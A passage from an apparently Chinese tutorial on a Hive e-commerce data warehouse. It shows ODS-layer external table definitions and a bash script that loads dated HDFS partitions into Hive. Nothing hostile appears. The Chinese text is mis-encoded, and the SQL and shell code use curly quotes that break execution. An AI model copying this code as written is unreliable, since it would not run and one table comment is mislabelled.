EXTERNAL TABLE ods_sku_attr_value_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`attr_id` STRING COMMENT â€˜å¹³å°å±æ€§IDâ€™,</p><p>`value_id` STRING COMMENT â€˜å¹³å°å±æ€§å€¼IDâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“IDâ€™,</p><p>`attr_name` STRING COMMENT â€˜å¹³å°å±æ€§åç§°â€™,</p><p>`value_name` STRING COMMENT â€˜å¹³å°å±æ€§å€¼åç§°â€™</p><p>) COMMENT â€˜skuå¹³å°å±æ€§è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_sku_attr_value_full/â€˜;</p><h4 id="å•†å“è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#å•†å“è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="å•†å“è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>å•†å“è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_sku_info_full;</p><p>CREATE EXTERNAL TABLE ods_sku_info_full</p><p>(</p><p>`id` STRING COMMENT â€˜skuIdâ€™,</p><p>`spu_id` STRING COMMENT â€˜spuidâ€™,</p><p>`price` DECIMAL(16, 2) COMMENT â€˜ä»·æ ¼â€™,</p><p>`sku_name` STRING COMMENT â€˜å•†å“åç§°â€™,</p><p>`sku_desc` STRING COMMENT â€˜å•†å“æè¿°â€™,</p><p>`weight` DECIMAL(16, 2) COMMENT â€˜é‡é‡â€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™,</p><p>`category3_id` STRING COMMENT â€˜å“ç±»idâ€™,</p><p>`sku_default_igm` STRING COMMENT â€˜å•†å“å›¾ç‰‡åœ°å€â€™,</p><p>`is_sale` STRING COMMENT â€˜æ˜¯å¦åœ¨å”®â€™,</p><p>`create_time` STRING COMMENT â€˜åˆ›å»ºæ—¶é—´â€™</p><p>) COMMENT â€˜SKUå•†å“è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_sku_info_full/â€˜;</p><h4 id="å•†å“é”€å”®å±æ€§å€¼è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#å•†å“é”€å”®å±æ€§å€¼è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="å•†å“é”€å”®å±æ€§å€¼è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>å•†å“é”€å”®å±æ€§å€¼è¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_sku_sale_attr_value_full;</p><p>CREATE EXTERNAL TABLE ods_sku_sale_attr_value_full</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`sku_id` STRING COMMENT â€˜sku_idâ€™,</p><p>`spu_id` STRING COMMENT â€˜spu_idâ€™,</p><p>`sale_attr_value_id` STRING COMMENT â€˜é”€å”®å±æ€§å€¼idâ€™,</p><p>`sale_attr_id` STRING COMMENT â€˜é”€å”®å±æ€§idâ€™,</p><p>`sale_attr_name` STRING COMMENT â€˜é”€å”®å±æ€§åç§°â€™,</p><p>`sale_attr_value_name` STRING COMMENT â€˜é”€å”®å±æ€§å€¼åç§°â€™</p><p>) COMMENT â€˜skué”€å”®å±æ€§åç§°â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_sku_sale_attr_value_full/â€˜;</p><h4 id="SPUè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"><a href="#SPUè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰" class="headerlink" title="SPUè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰"></a>SPUè¡¨ï¼ˆå…¨é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_spu_info_full;</p><p>CREATE EXTERNAL TABLE ods_spu_info_full</p><p>(</p><p>`id` STRING COMMENT â€˜spu_idâ€™,</p><p>`spu_name` STRING COMMENT â€˜spuåç§°â€™,</p><p>`description` STRING COMMENT â€˜æè¿°ä¿¡æ¯â€™,</p><p>`category3_id` STRING COMMENT â€˜å“ç±»idâ€™,</p><p>`tm_id` STRING COMMENT â€˜å“ç‰Œidâ€™</p><p>) COMMENT â€˜SPUå•†å“è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>NULL DEFINED AS â€˜â€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_spu_info_full/â€˜;</p><h4 id="è´­ç‰©è½¦è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è´­ç‰©è½¦è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è´­ç‰©è½¦è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è´­ç‰©è½¦è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_cart_info_inc;</p><p>CREATE EXTERNAL TABLE ods_cart_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,sku_id :STRING,cart_price<br>:DECIMAL(16, 2),sku_num :BIGINT,img_url :STRING,sku_name</p><p>:STRING,is_checked :STRING,create_time :STRING,operate_time :STRING,is_ordered<br>:STRING,order_time</p><p>:STRING,source_type :STRING,source_id :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è´­ç‰©è½¦å¢é‡è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_cart_info_inc/â€˜;</p><h4 id="è¯„è®ºè¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è¯„è®ºè¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è¯„è®ºè¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è¯„è®ºè¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_comment_info_inc;</p><p>CREATE EXTERNAL TABLE ods_comment_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,nick_name :STRING,head_img<br>:STRING,sku_id :STRING,spu_id :STRING,order_id</p><p>:STRING,appraise :STRING,comment_txt :STRING,create_time :STRING,operate_time<br>:STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è¯„ä»·è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_comment_info_inc/â€˜;</p><h4 id="ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_coupon_use_inc;</p><p>CREATE EXTERNAL TABLE ods_coupon_use_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,coupon_id :STRING,user_id :STRING,order_id<br>:STRING,coupon_status :STRING,get_time :STRING,using_time</p><p>:STRING,used_time :STRING,expire_time :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜ä¼˜æƒ åˆ¸é¢†ç”¨è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_coupon_use_inc/â€˜;</p><h4 id="æ”¶è—è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#æ”¶è—è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="æ”¶è—è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>æ”¶è—è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_favor_info_inc;</p><p>CREATE EXTERNAL TABLE ods_favor_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,sku_id :STRING,spu_id<br>:STRING,is_cancel :STRING,create_time :STRING,cancel_time</p><p>:STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜æ”¶è—è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_favor_info_inc/â€˜;</p><h4 id="è®¢å•æ˜ç»†è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è®¢å•æ˜ç»†è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è®¢å•æ˜ç»†è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è®¢å•æ˜ç»†è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_detail_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,sku_id :STRING,sku_name<br>:STRING,img_url :STRING,order_price</p><p>:DECIMAL(16, 2),sku_num :BIGINT,create_time :STRING,source_type<br>:STRING,source_id :STRING,split_total_amount</p><p>:DECIMAL(16, 2),split_activity_amount :DECIMAL(16, 2),split_coupon_amount</p><p>:DECIMAL(16, 2)&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è®¢å•æ˜ç»†è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_detail_inc/â€˜;</p><h4 id="è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_detail_activity_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_activity_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_detail_id :STRING,activity_id<br>:STRING,activity_rule_id :STRING,sku_id</p><p>:STRING,create_time :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è®¢å•æ˜ç»†æ´»åŠ¨å…³è”è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_detail_activity_inc/â€˜;</p><h4 id="è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_detail_coupon_inc;</p><p>CREATE EXTERNAL TABLE ods_order_detail_coupon_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_detail_id :STRING,coupon_id<br>:STRING,coupon_use_id :STRING,sku_id</p><p>:STRING,create_time :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è®¢å•æ˜ç»†ä¼˜æƒ åˆ¸å…³è”è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_detail_coupon_inc/â€˜;</p><h4 id="è®¢å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è®¢å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è®¢å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è®¢å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_info_inc;</p><p>CREATE EXTERNAL TABLE ods_order_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,consignee :STRING,consignee_tel :STRING,total_amount<br>:DECIMAL(16, 2),order_status :STRING,user_id</p><p>:STRING,payment_way :STRING,delivery_address :STRING,order_comment<br>:STRING,out_trade_no :STRING,trade_body</p><p>:STRING,create_time :STRING,operate_time :STRING,expire_time<br>:STRING,process_status :STRING,tracking_no</p><p>:STRING,parent_order_id :STRING,img_url :STRING,province_id<br>:STRING,activity_reduce_amount</p><p>:DECIMAL(16, 2),coupon_reduce_amount :DECIMAL(16, 2),original_total_amount<br>:DECIMAL(16, 2),freight_fee</p><p>:DECIMAL(16, 2),freight_fee_reduce :DECIMAL(16, 2),refundable_time :DECIMAL(16,<br>2)&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜è®¢å•è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_info_inc/â€˜;</p><h4 id="é€€å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#é€€å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="é€€å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>é€€å•è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_refund_info_inc;</p><p>CREATE EXTERNAL TABLE ods_order_refund_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,user_id :STRING,order_id :STRING,sku_id<br>:STRING,refund_type :STRING,refund_num :BIGINT,refund_amount</p><p>:DECIMAL(16, 2),refund_reason_type :STRING,refund_reason_txt<br>:STRING,refund_status :STRING,create_time</p><p>:STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜é€€å•è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_refund_info_inc/â€˜;</p><h4 id="è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>è®¢å•çŠ¶æ€æµæ°´è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_order_status_log_inc;</p><p>CREATE EXTERNAL TABLE ods_order_status_log_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,order_id :STRING,order_status :STRING,operate_time<br>:STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜é€€å•è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_order_status_log_inc/â€˜;</p><h4 id="æ”¯ä»˜è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#æ”¯ä»˜è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="æ”¯ä»˜è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>æ”¯ä»˜è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_payment_info_inc;</p><p>CREATE EXTERNAL TABLE ods_payment_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,out_trade_no :STRING,order_id :STRING,user_id<br>:STRING,payment_type :STRING,trade_no</p><p>:STRING,total_amount :DECIMAL(16, 2),subject :STRING,payment_status<br>:STRING,create_time :STRING,callback_time</p><p>:STRING,callback_content :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜æ”¯ä»˜è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_payment_info_inc/â€˜;</p><h4 id="é€€æ¬¾è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#é€€æ¬¾è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="é€€æ¬¾è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>é€€æ¬¾è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_refund_payment_inc;</p><p>CREATE EXTERNAL TABLE ods_refund_payment_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,out_trade_no :STRING,order_id :STRING,sku_id<br>:STRING,payment_type :STRING,trade_no :STRING,total_amount</p><p>:DECIMAL(16, 2),subject :STRING,refund_status :STRING,create_time<br>:STRING,callback_time :STRING,callback_content</p><p>:STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜é€€æ¬¾è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_refund_payment_inc/â€˜;</p><h4 id="ç”¨æˆ·è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"><a href="#ç”¨æˆ·è¡¨ï¼ˆå¢é‡è¡¨ï¼‰" class="headerlink" title="ç”¨æˆ·è¡¨ï¼ˆå¢é‡è¡¨ï¼‰"></a>ç”¨æˆ·è¡¨ï¼ˆå¢é‡è¡¨ï¼‰</h4><p>DROP TABLE IF EXISTS ods_user_info_inc;</p><p>CREATE EXTERNAL TABLE ods_user_info_inc</p><p>(</p><p>`type` STRING COMMENT â€˜å˜åŠ¨ç±»å‹â€™,</p><p>`ts` BIGINT COMMENT â€˜å˜åŠ¨æ—¶é—´â€™,</p><p>`data` STRUCT&lt;id :STRING,login_name :STRING,nick_name :STRING,passwd<br>:STRING,name :STRING,phone_num :STRING,email</p><p>:STRING,head_img :STRING,user_level :STRING,birthday :STRING,gender<br>:STRING,create_time :STRING,operate_time</p><p>:STRING,status :STRING&gt; COMMENT â€˜æ•°æ®â€™,</p><p>`old` MAP&lt;STRING,STRING&gt; COMMENT â€˜æ—§å€¼â€™</p><p>) COMMENT â€˜ç”¨æˆ·è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT SERDE â€˜org.apache.hadoop.hive.serde2.JsonSerDeâ€™</p><p>LOCATION â€˜/warehouse/gmall/ods/ods_user_info_inc/â€˜;</p><h4 id="æ•°æ®è£…è½½è„šæœ¬"><a href="#æ•°æ®è£…è½½è„šæœ¬" class="headerlink" title="æ•°æ®è£…è½½è„šæœ¬"></a>æ•°æ®è£…è½½è„šæœ¬</h4><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/home/atguigu/binç›®å½•ä¸‹åˆ›å»ºhdfs_to_ods_db.sh</p><p>[atguigu@hadoop102 bin]$ vim hdfs_to_ods_db.sh</p><p>ï¼ˆ2ï¼‰ç¼–å†™å¦‚ä¸‹å†…å®¹</p><p>##!/bin/bash</p><p>APP=gmall</p><p>if [ -n â€œ$2â€ ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d â€˜-1 dayâ€™ +%F`</p><p>fi</p><p>load_data(){</p><p>sql=â€â€</p><p>for i in $*; do</p><p>##åˆ¤æ–­è·¯å¾„æ˜¯å¦å­˜åœ¨</p><p>hadoop fs -test -e /origin_data/$APP/db/${i:4}/$do_date</p><p>##è·¯å¾„å­˜åœ¨æ–¹å¯è£…è½½æ•°æ®</p><p>if [[ $? = 0 ]]; then</p><p>sql=$sqlâ€load data inpath â€˜/origin_data/$APP/db/${i:4}/$do_dateâ€™ OVERWRITE<br>into table ${APP}.$i partition(dt=â€™$do_dateâ€™);â€</p><p>fi</p><p>done</p><p>hive -e â€œ$sqlâ€</p><p>}</p><p>case $1 in</p><p>â€œods_activity_info_fullâ€)</p><p>load_data â€œods_activity_info_fullâ€</p><p>;;</p><p>â€œods_activity_rule_fullâ€)</p><p>load_data â€œods_activity_rule_fullâ€</p><p>;;</p><p>â€œods_base_category1_fullâ€)</p><p>load_data â€œods_base_category1_fullâ€</p><p>;;</p><p>â€œods_base_category2_fullâ€)</p><p>load_data â€œods_base_category2_fullâ€</p><p>;;</p><p>â€œods_base_category3_fullâ€)</p><p>load_data â€œods_base_category3_fullâ€</p><p>;;</p><p>â€œods_base_dic_fullâ€)</p><p>load_data â€œods_base_dic_fullâ€</p><p>;;</p><p>â€œods_base_province_fullâ€)</p><p>load_data â€œods_base_province_fullâ€</p><p>;;</p><p>â€œods_base_region_fullâ€)</p><p>load_data â€œods_base_region_fullâ€</p><p>;;</p><p>â€œods_base_trademark_fullâ€)</p><p>load_data â€œods_base_trademark_fullâ€</p><p>;;</p><p>â€œods_cart_info_fullâ€)</p><p>load_data â€œods_cart_info_fullâ€</p><p>;;</p><p>â€œods_coupon_info_fullâ€)</p><p>load_data â€œods_coupon_info_fullâ€</p><p>;;</p><p>â€œods_sku_attr_value_fullâ€)</p><p>load_data â€œods_sku_attr_value_fullâ€</p><p>;;</p><p>â€œods_sku_info_fullâ€)</p><p>load_data â€œods_sku_info_fullâ€</p><p>;;</p><p>â€œods_sku_sale_attr_value_fullâ€)</p><p>load_data â€œods_sku_sale_attr_value_fullâ€</p><p>;;</p><p>â€œods_spu_info_fullâ€)</p><p>load_data â€œods_spu_info_fullâ€</p><p>;;</p><p>â€œods_cart_info_incâ€)</p><p>load_data â€œods_cart_info_incâ€</p><p>;;</p><p>â€œods_comment_info_incâ€)</p><p>load_data â€œods_comment_info_incâ€</p><p>;;</p><p>â€œods_coupon_use_incâ€)</p><p>load_data â€œods_coupon_use_incâ€</p><p>;;</p><p>â€œods_favor_info_incâ€)</p><p>load_data â€œods_favor_info_incâ€</p><p>;;</p><p>â€œods_order_detail_incâ€)</p><p>load_data â€œods_order_detail_incâ€</p><p>;;</p><p>â€œods_order_detail_activity_incâ€)</p><p>load_data â€œods_order_detail_activity_incâ€</p><p>;;</p><p>â€œods_order_detail_coupon_incâ€)</p><p>load_data â€œods_order_detail_coupon_incâ€</p><p>;;</p><p>â€œods_order_info_incâ€)</p><p>load_data â€œods_order_info_incâ€</p><p>;;</p><p>â€œods_order_refund_info_incâ€)</p><p>load_data â€œods_order_refund_info_incâ€</p><p>;;</p><p>â€œods_order_status_log_incâ€)</p><p>load_data â€œods_order_status_log_incâ€</p><p>;;</p><p>â€œods_payment_info_incâ€)</p><p>load_data â€œods_payment_info_incâ€</p><p>;;</p><p>â€œods_refund_payment_incâ€)</p><p>load_data â€œods_refund_payment_incâ€</p><p>;;</p><p>â€œods_user_info_incâ€)</p><p>load_data â€œods_user_info_incâ€</p><p>;;</p><p>â€œallâ€)</p><p>load_data â€œods_activity_info_fullâ€ â€œods_activity_rule_fullâ€<br>â€œods_base_category1_fullâ€ â€œods_base_category2_fullâ€ â€œods_base_category3_fullâ€<br>â€œods_base_dic_fullâ€ â€œods_base_province_fullâ€ â€œods_base_region_fullâ€<br>â€œods_base_trademark_fullâ€ â€œods_cart_info_fullâ€ â€œods_coupon_info_fullâ€<br>â€œods_sku_attr_value_fullâ€ â€œods_sku_info_fullâ€ â€œods_sku_sale_attr_value_fullâ€<br>â€œods_spu_info_fullâ€ â€œods_cart_info_incâ€ â€œods_comment_info_incâ€<br>â€œods_coupon_use_incâ€ â€œods_favor_info_incâ€ â€œods_order_detail_incâ€<br>â€œods_order_detail_activity_incâ€ â€œods_order_detail_coupon_incâ€<br>â€œods_order_info_incâ€ â€œods_order_refund_info_incâ€ â€œods_order_status_log_incâ€<br>â€œods_payment_info_incâ€ â€œods_refund_payment_incâ€ â€œods_user_info_incâ€</p><p>;;</p><p>esac</p><p>ï¼ˆ3ï¼‰å¢åŠ è„šæœ¬æ‰§è¡Œæƒé™</p><p>[atguigu@hadoop102 bin]$ chmod +x hdfs_to_ods_db.sh</p><p>ï¼ˆ4ï¼‰è„šæœ¬ç”¨æ³•</p><p>[atguigu@hadoop102 bin]$ hdfs_to_ods_db.sh all 2020-06-14</p><h2 id="ç¬¬8ç« -æ•°ä»“å¼€å‘ä¹‹DIMå±‚"><a href="#ç¬¬8ç« -æ•°ä»“å¼€å‘ä¹‹DIMå±‚" class="headerlink" title="ç¬¬8ç«  æ•°ä»“å¼€å‘ä¹‹DIMå±‚"></a>ç¬¬8ç«  